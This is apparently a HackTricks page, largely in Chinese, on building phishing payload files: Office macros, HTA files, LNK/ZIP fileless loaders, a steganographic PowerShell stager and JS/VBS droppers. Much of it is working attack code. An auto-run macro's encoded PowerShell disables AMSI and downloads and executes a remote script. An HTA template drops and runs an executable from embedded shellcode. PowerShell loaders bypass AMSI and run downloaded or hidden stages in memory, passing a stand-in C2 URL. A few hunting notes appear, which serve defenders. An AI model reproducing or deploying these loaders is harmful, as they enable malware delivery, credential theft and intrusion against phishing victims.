# Phishing 文件与文档

{{#include ../../banners/hacktricks-training.md}}

## Office 文档

Microsoft Word 在打开文件之前会执行文件数据验证。数据验证通过对数据结构的识别来执行，依据 OfficeOpenXML 标准。如果在数据结构识别过程中发生任何错误，被分析的文件将不会被打开。

通常，包含 macros 的 Word 文件使用 `.docm` 扩展名。However, it's possible to rename the file by changing the file extension and still keep their macro executing capabilities.\
例如，RTF 文件按设计不支持 macros，但如果将 DOCM 文件重命名为 RTF，Microsoft Word 仍会处理它，并能够执行 macros。\
相同的内部机制也适用于 Microsoft Office Suite 的所有软件（Excel、PowerPoint 等）。

你可以使用以下命令检查哪些扩展名将被某些 Office 程序执行：
```bash
assoc | findstr /i "word excel powerp"
```
DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.

### 外部图片加载

Go to: _Insert --> Quick Parts --> Field_\
_**类别**: 链接和引用, **字段名**: includePicture, 以及 **文件名或 URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros 后门

可以使用 macros 从文档运行任意代码。

#### 自动加载函数

它们越常见，被 AV 检测到的概率越高。

- AutoOpen()
- Document_Open()

#### Macros 代码示例
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### 手动移除元数据

转到 **File > Info > Inspect Document > Inspect Document**，这将打开 Document Inspector。点击 **Inspect**，然后在 **Document Properties and Personal Information** 旁边点击 **Remove All**。

#### 文档扩展名

完成后，从 **Save as type** 下拉菜单中选择，将格式从 **`.docx`** 更改为 **Word 97-2003 `.doc`**。\\  
这样做是因为你**不能在 `.docx` 中保存宏**，而且带宏的 **`.docm`** 扩展名有负面刻板印象（例如缩略图图标会显示一个巨大的 `!`，一些网页/邮件网关会完全阻止它们）。因此，使用这种**传统的 `.doc` 扩展名是最佳折衷**。

#### 恶意宏生成器

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA 文件

HTA 是一个 Windows 程序，**结合了 HTML 和脚本语言（例如 VBScript 和 JScript）**。它生成用户界面并作为“完全受信任”的应用程序运行，不受浏览器安全模型的限制。

HTA 使用 **`mshta.exe`** 执行，`mshta.exe` 通常与 **Internet Explorer** 一起**安装**，这使得 **`mshta` 依赖于 IE**。因此，如果它被卸载，HTA 将无法执行。
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## 强制 NTLM 认证

有多种方法可以**“远程”强制 NTLM authentication**，例如，你可以在用户将访问的邮件或 HTML 中添加**隐藏图像**（甚至通过 HTTP MitM？）。或者发送给受害者将会仅在**打开文件夹**时就**触发**一次**认证**的**文件地址**。

**在下面的页面中查看这些想法及更多内容：**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

别忘了，你不仅可以窃取 hash 或认证，还可以**执行 NTLM relay attacks**：

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

高度有效的活动通常发送一个 ZIP，里面包含两个合法的诱饵文档（PDF/DOCX）和一个恶意的 .lnk。诀窍在于实际的 PowerShell loader 存储在 ZIP 的原始字节中、位于一个唯一标记之后，而 .lnk 会从中提取并在内存中完全运行它。

由 .lnk PowerShell 单行命令实现的典型流程：

1) 在常见路径中定位原始 ZIP：Desktop、Downloads、Documents、%TEMP%、%ProgramData% 以及当前工作目录的父目录。  
2) 读取 ZIP 字节并查找硬编码标记（例如，xFIQCV）。标记之后的所有内容即为嵌入的 PowerShell payload。  
3) 将 ZIP 复制到 %ProgramData%，在那里解压，并打开诱饵 .docx 以显得合法。  
4) 为当前进程绕过 AMSI：[System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) 去混淆下一阶段（例如，移除所有 # 字符）并在内存中执行它。

示例 PowerShell 骨架，用于提取并运行嵌入的阶段：
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
备注
- 投递通常滥用值得信赖的 PaaS 子域（例如，*.herokuapp.com）并可能对 payloads 实施门控（根据 IP/UA 提供良性 ZIPs）。
- 下一个阶段通常解密 base64/XOR shellcode，并通过 Reflection.Emit + VirtualAlloc 执行以最小化磁盘痕迹。

同一链中使用的持久性机制
- COM TypeLib hijacking of the Microsoft Web Browser control，以便 IE/Explorer 或任何嵌入该控件的应用自动重新启动 payload。详情和现成命令见：

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

狩猎/IOCs
- ZIP 文件包含追加在归档数据后的 ASCII 标记字符串（例如，xFIQCV）。
- .lnk 枚举父/用户文件夹以定位 ZIP 并打开诱饵文档。
- AMSI 篡改（通过 [System.Management.Automation.AmsiUtils]::amsiInitFailed）。
- 以托管在可信 PaaS 域下的链接结尾的长时间运行的业务线程。

## Steganography-delimited payloads in images (PowerShell stager)

近期的 loader chains 交付一个混淆的 JavaScript/VBS，解码并运行一个 Base64 PowerShell stager。该 stager 下载一张图像（通常为 GIF），其中包含一个以 Base64 编码的 .NET DLL，作为纯文本隐藏在唯一的起始/结束标记之间。脚本搜索这些定界符（实战中见到的示例：«<<sudo_png>> … <<sudo_odt>>>»），提取两者之间的文本，将其 Base64 解码为字节，内存加载该 assembly 并调用已知入口方法，传入 C2 URL。

工作流程
- 阶段 1: Archived JS/VBS dropper → 解码嵌入的 Base64 → 使用 -nop -w hidden -ep bypass 启动 PowerShell stager。
- 阶段 2: PowerShell stager → 下载图像，提取标记定界的 Base64，内存加载 .NET DLL 并调用其方法（例如 VAI），传入 C2 URL 和选项。
- 阶段 3: Loader 检索最终 payload 并通常通过 process hollowing 将其注入到受信任的二进制（常见为 MSBuild.exe）中。关于 process hollowing 和 trusted utility proxy execution 的更多信息见：

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell 示例：从图像中提取 DLL 并在内存中调用 .NET 方法：

<details>
<summary>PowerShell stego payload 提取器和加载器</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

说明
- This is ATT&CK T1027.003 (steganography/marker-hiding)。标记在不同活动间会有所不同。
- AMSI/ETW bypass 和 string deobfuscation 通常在加载 assembly 之前被应用。
- Hunting：扫描下载的 images 以寻找已知分隔符；识别访问 images 并立即解码 Base64 blobs 的 PowerShell。

See also stego tools and carving techniques:

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

经常出现的初始阶段是一个小型、高度混淆的 `.js` 或 `.vbs`，作为压缩包内投递物。其唯一目的就是解码嵌入的 Base64 字符串，并以 `-nop -w hidden -ep bypass` 启动 PowerShell，通过 HTTPS 引导下一阶段。

Skeleton logic (abstract):
- 读取自身文件内容
- 在垃圾字符串之间定位 Base64 数据块
- 解码为 ASCII PowerShell
- 通过 `wscript.exe`/`cscript.exe` 调用 `powershell.exe` 执行

Hunting cues
- 压缩的 JS/VBS 附件在命令行中启动 `powershell.exe` 并带有 `-enc`/`FromBase64String`。
- `wscript.exe` 从用户临时路径启动 `powershell.exe -nop -w hidden`。

## Windows files to steal NTLM hashes

查看关于 **places to steal NTLM creds** 的页面：

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## 参考文献

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
